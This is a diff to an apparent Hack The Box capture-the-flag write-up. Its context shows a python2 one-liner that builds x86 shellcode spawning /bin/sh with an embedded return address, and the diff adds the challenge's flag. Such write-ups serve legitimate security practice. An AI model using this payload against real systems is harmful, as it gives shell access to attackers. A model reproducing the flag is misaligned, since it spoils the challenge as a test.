@@ -101,6 +101,8 @@ And compile it with:
 
 Generate payload: `python2 -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xeb\x04' + '\x41\xd0\xff\xff' + '\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80')" > payload`
 
+**Flag**: HTB{sh3llc0de_1n_7h3_5p4c3}
+
 ### You Know 0xDiaboles
 
 [Diablos](https://app.hackthebox.eu/challenges/You-know-0xDiablos)
